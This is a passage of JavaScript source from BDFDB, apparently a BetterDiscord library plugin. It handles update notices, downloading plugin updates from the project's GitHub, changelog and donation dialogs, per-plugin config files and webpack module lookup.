			vanishObserver.observe(document.body, {childList: true, subtree: true});
			updateNotice = BDFDB.NotificationUtils.notice(`${BDFDB.LanguageUtils.LibraryStrings.update_notice_update}&nbsp;&nbsp;&nbsp;&nbsp;<div class="${BDFDB.disCN.noticeupdateentries}"></div>`, {
				type: "info",
				className: BDFDB.disCN.noticeupdate,
				html: true,
				forceStyle: true,
				customIcon: `<svg width="24" height="24" viewBox="0 0 24 24"><path fill="currentColor" d="M 15.46875 0.859375 C 15.772992 1.030675 16.059675 1.2229406 16.326172 1.4316406 C 17.134815 2.0640406 17.768634 2.8677594 18.208984 3.8183594 C 18.665347 4.8050594 18.913286 5.9512625 18.945312 7.2265625 L 18.945312 7.2421875 L 18.945312 7.2597656 L 18.945312 16.753906 L 18.945312 16.769531 L 18.945312 16.785156 C 18.914433 18.060356 18.666491 19.206759 18.208984 20.193359 C 17.768634 21.144059 17.135961 21.947578 16.326172 22.580078 C 16.06768 22.782278 15.790044 22.967366 15.496094 23.134766 L 16.326172 23.134766 C 20.285895 23.158766 24 20.930212 24 15.820312 L 24 8.3535156 C 24.021728 3.1431156 20.305428 0.86132812 16.345703 0.86132812 L 15.46875 0.859375 z M 0 0.8671875 L 0 10.064453 L 4.4492188 15.191406 L 4.4492188 5.4394531 L 8.4394531 5.4394531 C 11.753741 5.4394531 11.753741 9.8828125 8.4394531 9.8828125 L 7.0234375 9.8828125 L 7.0234375 14.126953 L 8.4394531 14.126953 C 11.753741 14.126953 11.753741 18.568359 8.4394531 18.568359 L 0 18.568359 L 0 23.138672 L 8.3457031 23.138672 C 12.647637 23.138672 15.987145 21.3021 16.105469 16.75 C 16.105469 14.6555 15.567688 13.090453 14.621094 12.001953 C 15.567688 10.914853 16.105469 9.3502594 16.105469 7.2558594 C 15.988351 2.7036594 12.648845 0.8671875 8.3457031 0.8671875 L 0 0.8671875 z"/></svg>`,
				buttons: !BDFDB.BDUtils.getSettings(BDFDB.BDUtils.settingsIds.automaticLoading) && [{
					className: BDFDB.disCN.noticeupdatebuttonreload,
					contents: BDFDB.LanguageUtils.LanguageStrings.ERRORS_RELOAD,
					onClick: _ => location.reload(),
					onMouseEnter: _ => {
						if (PluginStores.updateData.downloaded) BDFDB.TooltipUtils.create(reloadButton, PluginStores.updateData.downloaded.join(", "), {
							type: "bottom",
							style: "max-width: 420px"
						});
					}
				}],
				buttons: [{
					className: BDFDB.disCN.noticeupdatebuttonall,
					contents: BDFDB.LanguageUtils.LanguageStrings.FORM_LABEL_ALL,
					onClick: _ => {for (let notice of updateNotice.querySelectorAll(BDFDB.dotCN.noticeupdateentry)) notice.click();}
				}],
				onClose: _ => vanishObserver.disconnect()
			});
			updateNotice.style.setProperty("position", "relative", "important");
			updateNotice.style.setProperty("visibility", "visible", "important");
			updateNotice.style.setProperty("opacity", "1", "important");
			updateNotice.style.setProperty("z-index", "100000", "important");
			let reloadButton = updateNotice.querySelector(BDFDB.dotCN.noticeupdatebuttonreload);
			if (reloadButton) BDFDB.DOMUtils.hide(reloadButton);
		}
		if (updateNotice) {
			let updateNoticeList = updateNotice.querySelector(BDFDB.dotCN.noticeupdateentries);
			if (updateNoticeList && !updateNoticeList.querySelector(`#${pluginName}-notice`)) {
				if (updateNoticeList.childElementCount) updateNoticeList.appendChild(BDFDB.DOMUtils.create(`<div class="${BDFDB.disCN.noticeupdateseparator}">, </div>`));
				let updateEntry = BDFDB.DOMUtils.create(`<div class="${BDFDB.disCN.noticeupdateentry}" id="${pluginName}-notice">${pluginName}</div>`);
				updateEntry.addEventListener("click", _ => {
					if (!updateEntry.wasClicked) {
						updateEntry.wasClicked = true;
						BDFDB.PluginUtils.downloadUpdate(pluginName, url);
					}
				});
				updateNoticeList.appendChild(updateEntry);
				if (!updateNoticeList.hasTooltip) {
					updateNoticeList.hasTooltip = true;
					updateNotice.tooltip = BDFDB.TooltipUtils.create(updateNoticeList, BDFDB.LanguageUtils.LibraryStrings.update_notice_click, {
						type: "bottom",
						zIndex: 100001,
						delay: 500,
						onHide: _ => {updateNoticeList.hasTooltip = false;}
					});
				}
			}
		}
	};
	BDFDB.PluginUtils.removeUpdateNotice = function (pluginName, updateNotice = document.querySelector(BDFDB.dotCN.noticeupdate)) {
		if (!pluginName || !updateNotice) return;
		let updateNoticeList = updateNotice.querySelector(BDFDB.dotCN.noticeupdateentries);
		if (updateNoticeList) {
			let noticeEntry = updateNoticeList.querySelector(`#${pluginName}-notice`);
			if (noticeEntry) {
				let nextSibling = noticeEntry.nextSibling;
				let prevSibling = noticeEntry.prevSibling;
				if (nextSibling && BDFDB.DOMUtils.containsClass(nextSibling, BDFDB.disCN.noticeupdateseparator)) nextSibling.remove();
				else if (prevSibling && BDFDB.DOMUtils.containsClass(prevSibling, BDFDB.disCN.noticeupdateseparator)) prevSibling.remove();
				noticeEntry.remove();
			}
			if (!updateNoticeList.childElementCount) {
				let reloadButton = updateNotice.querySelector(BDFDB.dotCN.noticeupdatebuttonreload);
				if (reloadButton) {
					updateNotice.querySelector(BDFDB.dotCN.noticetext).innerText = BDFDB.LanguageUtils.LibraryStrings.update_notice_reload;
					BDFDB.DOMUtils.show(reloadButton);
				}
				else updateNotice.querySelector(BDFDB.dotCN.noticedismiss).click();
			}
		}
	};
	BDFDB.PluginUtils.downloadUpdate = function (pluginName, url) {
		if (pluginName && url) Internal.LibraryRequires.request(url, (error, response, body) => {
			if (error) {
				BDFDB.PluginUtils.removeUpdateNotice(pluginName);
				BDFDB.NotificationUtils.toast(BDFDB.LanguageUtils.LibraryStringsFormat("toast_plugin_update_failed", pluginName), {
					type: "danger",
					disableInteractions: true
				});
			}
			else {
				let wasEnabled = BDFDB.BDUtils.isPluginEnabled(pluginName);
				let newName = (body.match(/"name"\s*:\s*"([^"]+)"/) || [])[1] || pluginName;
				let newVersion = (body.match(/@version ([0-9]+\.[0-9]+\.[0-9]+)|['"]([0-9]+\.[0-9]+\.[0-9]+)['"]/i) || []).filter(n => n)[1];
				let oldVersion = PluginStores.updateData.plugins[url].version;
				let fileName = pluginName == "BDFDB" ? "0BDFDB" : pluginName;
				let newFileName = newName == "BDFDB" ? "0BDFDB" : newName;
				Internal.LibraryRequires.fs.writeFile(Internal.LibraryRequires.path.join(BDFDB.BDUtils.getPluginsFolder(), newFileName + ".plugin.js"), body, _ => {
					if (PluginStores.updateData.plugins[url]) PluginStores.updateData.plugins[url].version = newVersion;
					if (fileName != newFileName) {
						Internal.LibraryRequires.fs.unlink(Internal.LibraryRequires.path.join(BDFDB.BDUtils.getPluginsFolder(), fileName + ".plugin.js"), _ => {});
						let configPath = Internal.LibraryRequires.path.join(BDFDB.BDUtils.getPluginsFolder(), fileName + ".config.json");
						Internal.LibraryRequires.fs.exists(configPath, exists => {
							if (exists) Internal.LibraryRequires.fs.rename(configPath, Internal.LibraryRequires.path.join(BDFDB.BDUtils.getPluginsFolder(), newFileName + ".config.json"), _ => {});
						});
						BDFDB.TimeUtils.timeout(_ => {if (wasEnabled && !BDFDB.BDUtils.isPluginEnabled(newName)) BDFDB.BDUtils.enablePlugin(newName);}, 3000);
					}
					BDFDB.NotificationUtils.toast(BDFDB.LanguageUtils.LibraryStringsFormat("toast_plugin_updated", pluginName, "v" + oldVersion, newName, "v" + newVersion), {
						disableInteractions: true
					});
					let updateNotice = document.querySelector(BDFDB.dotCN.noticeupdate);
					if (updateNotice) {
						if (updateNotice.querySelector(BDFDB.dotCN.noticebutton) && !PluginStores.updateData.downloaded.includes(pluginName)) {
							PluginStores.updateData.downloaded.push(pluginName);
						}
						BDFDB.PluginUtils.removeUpdateNotice(pluginName, updateNotice);
					}
				});
			}
		});
	};
	BDFDB.PluginUtils.checkChangeLog = function (plugin) {
		if (!BDFDB.ObjectUtils.is(plugin) || !BDFDB.ObjectUtils.is(plugin.changeLog)) return;
		if (!changeLogs[plugin.name] || BDFDB.NumberUtils.compareVersions(plugin.version, changeLogs[plugin.name])) {
			changeLogs[plugin.name] = plugin.version;
			BDFDB.DataUtils.save(changeLogs, BDFDB, "changeLogs");
			BDFDB.PluginUtils.openChangeLog(plugin);
		}
	};
	BDFDB.PluginUtils.openChangeLog = function (plugin) {
		if (!BDFDB.ObjectUtils.is(plugin) || !BDFDB.ObjectUtils.is(plugin.changeLog)) return;
		let changeLogHTML = "", headers = {
			added: "New Features",
			fixed: "Bug Fixes",
			improved: "Improvements",
			progress: "Progress"
		};
		for (let type in plugin.changeLog) {
			type = type.toLowerCase();
			let className = BDFDB.disCN["changelog" + type];
			if (className) {
				changeLogHTML += `<h1 class="${className} ${BDFDB.disCN.margintop20}"${changeLogHTML.indexOf("<h1") == -1 ? `style="margin-top: 0px !important;"` : ""}>${BDFDB.LanguageUtils && BDFDB.LanguageUtils.LibraryStrings ? BDFDB.LanguageUtils.LibraryStrings["changelog_" + type]  : headers[type]}</h1><ul>`;
				for (let key in plugin.changeLog[type]) changeLogHTML += `<li><strong>${key}</strong>${plugin.changeLog[type][key] ? (": " + plugin.changeLog[type][key] + ".") : ""}</li>`;
				changeLogHTML += `</ul>`
			}
		}
		if (changeLogHTML) BDFDB.ModalUtils.open(plugin, {
			header: `${plugin.name} ${BDFDB.LanguageUtils.LanguageStrings.CHANGE_LOG}`,
			subHeader: `Version ${plugin.version}`,
			className: BDFDB.disCN.modalchangelogmodal,
			contentClassName: BDFDB.disCNS.changelogcontainer + BDFDB.disCN.modalminicontent,
			footerDirection: Internal.LibraryComponents.Flex.Direction.HORIZONTAL,
			children: BDFDB.ReactUtils.elementToReact(BDFDB.DOMUtils.create(changeLogHTML)),
			footerChildren: (plugin == BDFDB || plugin == libraryInstance || PluginStores.loaded[plugin.name] && PluginStores.loaded[plugin.name] == plugin && plugin.author == "DevilBro") && BDFDB.ReactUtils.createElement("div", {
				className: BDFDB.disCN.changelogfooter,
				children: [{
					href: "https://www.paypal.me/MircoWittrien",
					name: "PayPal",
					icon: "PAYPAL"
				}, {
					href: "https://www.patreon.com/MircoWittrien",
					name: "Patreon",
					icon: "PATREON"
				}, {
					name: BDFDB.LanguageUtils.LibraryStringsFormat("send", "Solana"),
					icon: "PHANTOM",
					onClick: _ => {
						BDFDB.LibraryRequires.electron.clipboard.write({text: InternalData.mySolana});
						BDFDB.NotificationUtils.toast(BDFDB.LanguageUtils.LibraryStringsFormat("clipboard_success", "Phantom Wallet Key"), {
							type: "success"
						});
					}
				}, {
					name: BDFDB.LanguageUtils.LibraryStringsFormat("send", "Ethereum"),
					icon: "METAMASK",
					onClick: _ => {
						BDFDB.LibraryRequires.electron.clipboard.write({text: InternalData.myEthereum});
						BDFDB.NotificationUtils.toast(BDFDB.LanguageUtils.LibraryStringsFormat("clipboard_success", "MetaMask Wallet Key"), {
							type: "success"
						});
					}
				}].map(data => BDFDB.ReactUtils.createElement(data.href ? Internal.LibraryComponents.Anchor : Internal.LibraryComponents.Clickable, {
					className: BDFDB.disCN.changelogsociallink,
					href: data.href || "",
					onClick: !data.onClick ? (_ => {}) : data.onClick,
					children: BDFDB.ReactUtils.createElement(Internal.LibraryComponents.TooltipContainer, {
						text: data.name,
						children: BDFDB.ReactUtils.createElement(Internal.LibraryComponents.SvgIcon, {
							name: Internal.LibraryComponents.SvgIcon.Names[data.icon],
							width: 16,
							height: 16
						})
					})
				})).concat(BDFDB.ReactUtils.createElement(Internal.LibraryComponents.TextElement, {
					size: Internal.LibraryComponents.TextElement.Sizes.SIZE_12,
					children: BDFDB.LanguageUtils.LibraryStrings.donate_message
				}))
			})
		});
	};
	BDFDB.PluginUtils.addLoadingIcon = function (icon) {
		if (!Node.prototype.isPrototypeOf(icon)) return;
		let app = document.querySelector(BDFDB.dotCN.app);
		if (!app) return;
		BDFDB.DOMUtils.addClass(icon, BDFDB.disCN.loadingicon);
		let loadingIconWrapper = document.querySelector(BDFDB.dotCN.app + ">" + BDFDB.dotCN.loadingiconwrapper)
		if (!loadingIconWrapper) {
			loadingIconWrapper = BDFDB.DOMUtils.create(`<div class="${BDFDB.disCN.loadingiconwrapper}"></div>`);
			app.appendChild(loadingIconWrapper);
			let killObserver = new MutationObserver(changes => {if (!loadingIconWrapper.firstElementChild) BDFDB.DOMUtils.remove(loadingIconWrapper);});
			killObserver.observe(loadingIconWrapper, {childList: true});
		}
		loadingIconWrapper.appendChild(icon);
	};
	BDFDB.PluginUtils.createSettingsPanel = function (addon, props) {
		if (!window.BDFDB_Global.loaded) return "Could not initiate BDFDB Library Plugin! Can not create Settings Panel!";
		addon = addon == BDFDB && Internal || addon;
		if (!BDFDB.ObjectUtils.is(addon)) return;
		let settingsProps = props;
		if (settingsProps && !BDFDB.ObjectUtils.is(settingsProps) && (BDFDB.ReactUtils.isValidElement(settingsProps) || BDFDB.ArrayUtils.is(settingsProps))) settingsProps = {
			children: settingsProps
		};
		return BDFDB.ReactUtils.createElement(Internal.LibraryComponents.SettingsPanel, Object.assign({
			addon: addon,
			collapseStates: settingsProps && settingsProps.collapseStates
		}, settingsProps));
	};
	BDFDB.PluginUtils.refreshSettingsPanel = function (plugin, settingsPanel, ...args) {
		if (BDFDB.ObjectUtils.is(plugin)) {
			if (settingsPanel && settingsPanel.props && BDFDB.ObjectUtils.is(settingsPanel.props._instance)) {
				settingsPanel.props._instance.props = Object.assign({}, settingsPanel.props._instance.props, ...args);
				BDFDB.ReactUtils.forceUpdate(settingsPanel.props._instance);
			}
			else if (typeof plugin.getSettingsPanel == "function" && Node.prototype.isPrototypeOf(settingsPanel) && settingsPanel.parentElement) {
				settingsPanel.parentElement.appendChild(plugin.getSettingsPanel(...args));
				settingsPanel.remove();
			}
		}
	};

	window.BDFDB_Global = Object.assign({
		started: true,
		loading: true,
		PluginUtils: {
			buildPlugin: BDFDB.PluginUtils.buildPlugin,
			cleanUp: BDFDB.PluginUtils.cleanUp
		}
	}, config, window.BDFDB_Global);

	
	const request = require("request"), fs = require("fs"), path = require("path");
	
	Internal.writeConfig = function (plugin, path, config) {
		let allData = {};
		try {allData = JSON.parse(fs.readFileSync(path));}
		catch (err) {allData = {};}
		try {fs.writeFileSync(path, JSON.stringify(Object.assign({}, allData, {[Internal.shouldSyncConfig(plugin) ? "all" : BDFDB.UserUtils.me.id]: config}), null, "	"));}
		catch (err) {}
	};
	Internal.readConfig = function (plugin, path) {
		let sync = Internal.shouldSyncConfig(plugin);
		try {
			let config = JSON.parse(fs.readFileSync(path));
			if (config && Object.keys(config).some(n => !(n == "all" || parseInt(n)))) {
				config = {[Internal.shouldSyncConfig(plugin) ? "all" : BDFDB.UserUtils.me.id]: config};
				try {fs.writeFileSync(path, JSON.stringify(config, null, "	"));}
				catch (err) {}
			}
			return config && config[sync ? "all" : BDFDB.UserUtils.me.id] || {};
		}
		catch (err) {return {};}
	};
	Internal.shouldSyncConfig = function (plugin) {
		return plugin.neverSyncData !== undefined ? !plugin.neverSyncData : (plugin.forceSyncData || Internal.settings.general.shareData);
	};
	
	BDFDB.DataUtils = {};
	BDFDB.DataUtils.save = function (data, plugin, key, id) {
		plugin = plugin == BDFDB && Internal || plugin;
		let pluginName = typeof plugin === "string" ? plugin : plugin.name;
		let fileName = pluginName == "BDFDB" ? "0BDFDB" : pluginName;
		let configPath = path.join(BDFDB.BDUtils.getPluginsFolder(), fileName + ".config.json");
		
		let config = Cache.data[pluginName] !== undefined ? Cache.data[pluginName] : (Internal.readConfig(plugin, configPath) || {});
		
		if (key === undefined) config = BDFDB.ObjectUtils.is(data) ? BDFDB.ObjectUtils.sort(data) : data;
		else {
			if (id === undefined) config[key] = BDFDB.ObjectUtils.is(data) ? BDFDB.ObjectUtils.sort(data) : data;
			else {
				if (!BDFDB.ObjectUtils.is(config[key])) config[key] = {};
				config[key][id] = BDFDB.ObjectUtils.is(data) ? BDFDB.ObjectUtils.sort(data) : data;
			}
		}
		
		let configIsObject = BDFDB.ObjectUtils.is(config);
		if (key !== undefined && configIsObject && BDFDB.ObjectUtils.is(config[key]) && BDFDB.ObjectUtils.isEmpty(config[key])) delete config[key];
		if (BDFDB.ObjectUtils.isEmpty(config)) {
			delete Cache.data[pluginName];
			if (fs.existsSync(configPath)) fs.unlinkSync(configPath);
		}
		else {
			if (configIsObject) config = BDFDB.ObjectUtils.sort(config);
			Cache.data[pluginName] = configIsObject ? BDFDB.ObjectUtils.deepAssign({}, config) : config;
			Internal.writeConfig(plugin, configPath, config);
		}
	};

	BDFDB.DataUtils.load = function (plugin, key, id) {
		plugin = plugin == BDFDB && Internal || plugin;
		let pluginName = typeof plugin === "string" ? plugin : plugin.name;
		let fileName = pluginName == "BDFDB" ? "0BDFDB" : pluginName;
		let configPath = path.join(BDFDB.BDUtils.getPluginsFolder(), fileName + ".config.json");
		
		let config = Cache.data[pluginName] !== undefined ? Cache.data[pluginName] : (Internal.readConfig(plugin, configPath) || {});
		let configIsObject = BDFDB.ObjectUtils.is(config);
		Cache.data[pluginName] = configIsObject ? BDFDB.ObjectUtils.deepAssign({}, config) : config;
		
		if (key === undefined) return config;
		else {
			let keyData = configIsObject ? (BDFDB.ObjectUtils.is(config[key]) || config[key] === undefined ? BDFDB.ObjectUtils.deepAssign({}, config[key]) : config[key]) : null;
			if (id === undefined) return keyData;
			else return !BDFDB.ObjectUtils.is(keyData) || keyData[id] === undefined ? null : keyData[id];
		}
	};
	BDFDB.DataUtils.remove = function (plugin, key, id) {
		plugin = plugin == BDFDB && Internal || plugin;
		let pluginName = typeof plugin === "string" ? plugin : plugin.name;
		let fileName = pluginName == "BDFDB" ? "0BDFDB" : pluginName;
		let configPath = path.join(BDFDB.BDUtils.getPluginsFolder(), fileName + ".config.json");
		
		let config = Cache.data[pluginName] !== undefined ? Cache.data[pluginName] : (Internal.readConfig(plugin, configPath) || {});
		let configIsObject = BDFDB.ObjectUtils.is(config);
		
		if (key === undefined || !configIsObject) config = {};
		else {
			if (id === undefined) delete config[key];
			else if (BDFDB.ObjectUtils.is(config[key])) delete config[key][id];
		}
		
		if (BDFDB.ObjectUtils.is(config[key]) && BDFDB.ObjectUtils.isEmpty(config[key])) delete config[key];
		if (BDFDB.ObjectUtils.isEmpty(config)) {
			delete Cache.data[pluginName];
			if (fs.existsSync(configPath)) fs.unlinkSync(configPath);
		}
		else {
			if (configIsObject) config = BDFDB.ObjectUtils.sort(config);
			Cache.data[pluginName] = configIsObject ? BDFDB.ObjectUtils.deepAssign({}, config) : config;
			Internal.writeConfig(plugin, configPath, config);
		}
	};
	BDFDB.DataUtils.get = function (plugin, key, id) {
		plugin = plugin == BDFDB && Internal || plugin;
		plugin = typeof plugin == "string" ? BDFDB.BDUtils.getPlugin(plugin) : plugin;
		const defaults = plugin && plugin.defaults;
		if (!BDFDB.ObjectUtils.is(defaults) || key && !BDFDB.ObjectUtils.is(defaults[key])) return id === undefined ? {} : null;
		let oldC = BDFDB.DataUtils.load(plugin), newC = {}, update = false;
		const checkLayer = (i, j) => {
			let isObj = BDFDB.ObjectUtils.is(defaults[i][j].value);
			if (!newC[i]) newC[i] = {};
			if (oldC[i] == null || oldC[i][j] == null || isObj && (!BDFDB.ObjectUtils.is(oldC[i][j]) || Object.keys(defaults[i][j].value).some(n => defaults[i][j].value[n] != null && !BDFDB.sameProto(defaults[i][j].value[n], oldC[i][j][n])))) {
				newC[i][j] = isObj ? BDFDB.ObjectUtils.deepAssign({}, defaults[i][j].value) : defaults[i][j].value;
				update = true;
			}
			else newC[i][j] = oldC[i][j];
		};
		if (key) {for (let j in defaults[key]) checkLayer(key, j);}
		else {for (let i in defaults) if (BDFDB.ObjectUtils.is(defaults[i])) for (let j in defaults[i]) checkLayer(i, j);}
		if (update) BDFDB.DataUtils.save(Object.assign({}, oldC, newC), plugin);
		
		if (key === undefined) return newC;
		else if (id === undefined) return newC[key] === undefined ? {} : newC[key];
		else return newC[key] === undefined || newC[key][id] === undefined ? null : newC[key][id];
	};
	
	const cssFileName = "0BDFDB.raw.css";
	const dataFileName = "0BDFDB.data.json";
	const cssFilePath = path.join(BDFDB.BDUtils.getPluginsFolder(), cssFileName);
	const dataFilePath = path.join(BDFDB.BDUtils.getPluginsFolder(), dataFileName);
	let InternalData, libHashes = {}, oldLibHashes = BDFDB.DataUtils.load(BDFDB, "hashes"), libraryCSS;
	
	const getBackup = (fileName, path) => {
		return libHashes[fileName] && oldLibHashes[fileName] && libHashes[fileName] == oldLibHashes[fileName] && fs.existsSync(path) && (fs.readFileSync(path) || "").toString();
	};
	const requestLibraryHashes = tryAgain => {
		request("https://api.github.com/repos/mwittrien/BetterDiscordAddons/contents/Library/_res/", {headers: {"user-agent": "node.js"}}, (e, r, b) => {
			if ((e || !b || r.statusCode != 200) && tryAgain) return BDFDB.TimeUtils.timeout(_ => requestLibraryHashes(), 10000);
			try {
				b = JSON.parse(b);
				libHashes[cssFileName] = (b.find(n => n && n.name == cssFileName) || {}).sha;
				libHashes[dataFileName] = (b.find(n => n && n.name == dataFileName) || {}).sha;
				BDFDB.DataUtils.save(libHashes, BDFDB, "hashes")
				requestLibraryData(true);
			}
			catch (err) {requestLibraryData(true);}
		});
	};
	const requestLibraryData = tryAgain => {
		const parseCSS = css => {
			libraryCSS = css;
		
			const backupData = getBackup(dataFileName, dataFilePath);
			if (backupData) parseData(backupData);
			else request.get(`https://mwittrien.github.io/BetterDiscordAddons/Library/_res/${dataFileName}`, (e, r, b) => {
				if ((e || !b || r.statusCode != 200) && tryAgain) return BDFDB.TimeUtils.timeout(_ => requestLibraryData(), 10000);
				if (!e && b && r.statusCode == 200) parseData(b, true);
				else parseData(fs.existsSync(dataFilePath) && (fs.readFileSync(dataFilePath) || "").toString());
			});
		};
		const parseData = (dataString, fetched) => {
			try {InternalData = JSON.parse(dataString);}
			catch (err) {
				if (fetched) {
					try {
						dataString = fs.existsSync(dataFilePath) && (fs.readFileSync(dataFilePath) || "").toString();
						InternalData = JSON.parse(dataString);
					}
					catch (err2) {BDFDB.LogUtils.error(["Failed to initiate Library!", "Failed Fetch!", dataString ? "Corrupt Backup." : "No Backup.", , err2]);}
				}
				else BDFDB.LogUtils.error(["Failed to initiate Library!", dataString ? "Corrupt Backup." : "No Backup.", err]);
			}
			if (fetched && dataString) fs.writeFile(dataFilePath, dataString, _ => {});
			
			Internal.getWebModuleReq = function () {
				if (!Internal.getWebModuleReq.req) {
					const id = "BDFDB-WebModules";
					const req = window.webpackJsonp.push([[], {[id]: (module, exports, req) => module.exports = req}, [[id]]]);
					delete req.m[id];
					delete req.c[id];
					Internal.getWebModuleReq.req = req;
				}
				return Internal.getWebModuleReq.req;
			};
			
			if (InternalData) loadLibrary();
			else BdApi.alert("Error", "Could not initiate BDFDB Library Plugin. Check your Internet Connection and make sure GitHub isn't blocked by your Network or try disabling your VPN/Proxy.");
		};
		
		const backupCSS = getBackup(cssFileName, cssFilePath);
		if (backupCSS) parseCSS(backupCSS);
		else request.get(`https://mwittrien.github.io/BetterDiscordAddons/Library/_res/${cssFileName}`, (e, r, b) => {
			if ((e || !b || r.statusCode != 200) && tryAgain) return BDFDB.TimeUtils.timeout(_ => requestLibraryData(), 10000);
			if (!e && b && r.statusCode == 200) {
				fs.writeFile(cssFilePath, b, _ => {});
				parseCSS(b);
			}
			else parseCSS(fs.existsSync(cssFilePath) && (fs.readFileSync(cssFilePath) || "").toString());
		});
	};
	const loadLibrary = _ => {
		InternalData.UserBackgrounds = {};
		if (InternalData.userBackgroundsUrl && InternalData.userBackgroundsProperties) request(InternalData.userBackgroundsUrl, (e3, r3, b3) => {
			if (!e3 && b3 && r3.statusCode == 200) {
				const log = BDFDB.UserUtils.me.id == InternalData.myId || BDFDB.UserUtils.me.id == "350635509275557888", notUsedValues = [];
				try {
					InternalData.UserBackgrounds = JSON.parse(b3);
					for (let id in InternalData.UserBackgrounds) {
						let user = {};
						for (let key in InternalData.UserBackgrounds[id]) {
							if (InternalData.userBackgroundsProperties[key]) user[InternalData.userBackgroundsProperties[key]] = key == "background" ? `url(${InternalData.UserBackgrounds[id][key]})` : InternalData.UserBackgrounds[id][key];
							else if (log && !notUsedValues.includes(key)) notUsedValues.push(key);
						}
						InternalData.UserBackgrounds[id] = user;
					}
					if (notUsedValues.length) BDFDB.LogUtils.warn(["Found unused variables in usrbgs!", notUsedValues]);
				}
				catch (err) {
					InternalData.UserBackgrounds = {};
					if (log) BDFDB.LogUtils.error(["Could not load usrbgs!", err]);
				}
			}
		});
		
		Internal.getPluginURL = function (plugin) {
			plugin = plugin == BDFDB && Internal || plugin;
			if (BDFDB.ObjectUtils.is(plugin)) {
				if (plugin.rawUrl) return plugin.rawUrl;
				else {
					let name = InternalData.PluginNameMap && InternalData.PluginNameMap[plugin.name] || plugin.name;
					return `https://mwittrien.github.io/BetterDiscordAddons/Plugins/${name}/${name}.plugin.js`;
				}
			}
			else return "";
		};
		
		Internal.findModule = function (type, cacheString, filter, useExport, noWarnings = false) {
			if (!BDFDB.ObjectUtils.is(Cache.modules[type])) Cache.modules[type] = {module: {}, export: {}};
			if (useExport && Cache.modules[type].export[cacheString]) return Cache.modules[type].export[cacheString];
			else if (!useExport && Cache.modules[type].module[cacheString]) return Cache.modules[type].module[cacheString];
			else {
				let m = BDFDB.ModuleUtils.find(filter, {useExport: useExport});
				if (m) {
					if (useExport) Cache.modules[type].export[cacheString] = m;
					else Cache.modules[type].module[cacheString] = m;
					return m;
				}
				else if (!noWarnings) BDFDB.LogUtils.warn(`${cacheString} [${type}] not found in WebModules`);
			}
		};
		
		Internal.hasModuleStrings = function (module, strings, ignoreCase) {
			const toString = n => ignoreCase ? n.toString().toLowerCase() : n.toString();
			return [strings].flat(10).filter(n => typeof n == "string").map(ignoreCase ? (n => n.toLowerCase()) : (n => n)).every(string => typeof module == "function" && (toString(module).indexOf(string) > -1 || typeof module.__originalMethod == "function" && toString(module.__originalMethod).indexOf(string) > -1 || typeof module.__originalFunction == "function" && toString(module.__originalFunction).indexOf(string) > -1) || BDFDB.ObjectUtils.is(module) && typeof module.type == "function" && toString(module.type).indexOf(string) > -1);
		};
		
		Internal.getModuleString = function (module) {
			const id = (BDFDB.ModuleUtils.find(m => m == module && m, {useExport: false}) || {}).id;
			if (!id) return "";
			const req = Internal.getWebModuleReq();
			return (req.m[id] || "").toString();
		};
		
		Internal.lazyLoadModuleImports = function (moduleString) {
			return new Promise(callback => {
				if (typeof moduleString !== "string") moduleString = Internal.getModuleString(moduleString);
				if (!moduleString || typeof moduleString !== "string") {
					BDFDB.LogUtils.error("Trying to lazy load Imports but Module is not a String");
					return callback(null);
				}
				let run = true, imports = [], menuIndexes = [];
				while (run) {
					const [matchString, promiseMatch, menuRequest] = moduleString.match(/return (Promise\.all\(.+?\))\.then\((.+?)\)\)/) ?? [];
					if (!promiseMatch) run = false;
					else {
						imports = imports.concat(promiseMatch.match(/\d+/g)?.map(e => Number(e)));
						menuIndexes.push(menuRequest.match(/\d+/)?.[0]);
						moduleString = moduleString.replace(matchString, "");
					}
				}
				if (!imports.length || !menuIndexes.length) {
					BDFDB.LogUtils.error("Trying to lazy load Imports but could not find Indexes");
					return callback(null);
				}
				const req = Internal.getWebModuleReq();
				Promise.all(BDFDB.ArrayUtils.removeCopies(imports).map(i => req.e(i))).then(_ => Promise.all(BDFDB.ArrayUtils.removeCopies(menuIndexes).map(i => req(i)))).then(callback);
			});
		};
		
		BDFDB.ModuleUtils = {};
		BDFDB.ModuleUtils.find = function (filter, config = {}) {
			let useExport = typeof config.useExport != "boolean" ? true : config.useExport;
			let onlySearchUnloaded = typeof config.onlySearchUnloaded != "boolean" ? false : config.onlySearchUnloaded;
			let all = typeof config.all != "boolean" ? false : config.all;
			const req = Internal.getWebModuleReq();
			const found = [];
			if (!onlySearchUnloaded) for (let i in req.c) if (req.c.hasOwnProperty(i)) {
				let m = req.c[i].exports, r = null;
				if (m && (typeof m == "object" || typeof m == "function") && !!(r = filter(m))) {
					if (all) found.push(useExport ? r : req.c[i]);
					else return useExport ? r : req.c[i];
				}
				if (m && m.__esModule && m.default && (typeof m.default == "object" || typeof m.default == "function")) {
					if (!!(r = filter(m.default))) {
						if (all) found.push(useExport ? r : req.c[i]);
						else return useExport ? r : req.c[i];
					}
					else if (m.default.type && (typeof m.default.type == "object" || typeof m.default.type == "function") && !!(r = filter(m.default.type))) {
						if (all) found.push(useExport ? r : req.c[i]);
						else return useExport ? r : req.c[i];
					}
				}
			}
			for (let i in req.m) if (req.m.hasOwnProperty(i)) {
				let m = req.m[i];
				if (m && typeof m == "function") {
					if (req.c[i] && !onlySearchUnloaded && filter(m)) {
						if (all) found.push(useExport ? req.c[i].exports : req.c[i]);
						else return useExport ? req.c[i].exports : req.c[i];
					}
					if (!req.c[i] && onlySearchUnloaded && filter(m)) {
						const resolved = {}, resolved2 = {};
						m(resolved, resolved2, req);
						const trueResolved = resolved2 && BDFDB.ObjectUtils.isEmpty(resolved2) ? resolved : resolved2;
						if (all) found.push(useExport ? trueResolved.exports : trueResolved);
						else return useExport ? trueResolved.exports : trueResolved;
					}
				}
			}
			if (all) return found;
		};
		BDFDB.ModuleUtils.findByProperties = function (...properties) {
			properties = properties.flat(10);
			let arg2 = properties.pop();
			let arg1 = properties.pop();
			let useExport = true, noWarnings = false;
			if (typeof arg2 != "boolean") properties.push(...[arg1, arg2].filter(n => n));
			else {
				if (typeof arg1 != "boolean") {
					if (arg1) properties.push(arg1);
					useExport = arg2;
				}
				else {
					useExport = arg1;
					noWarnings = arg2;
				}
			}
			return Internal.findModule("prop", JSON.stringify(properties), m => properties.every(prop => {
				const value = m[prop];
				return value !== undefined && !(typeof value == "string" && !value);
			}) && m, useExport, noWarnings);
		};
		BDFDB.ModuleUtils.findByName = function (name, useExport, noWarnings = false) {
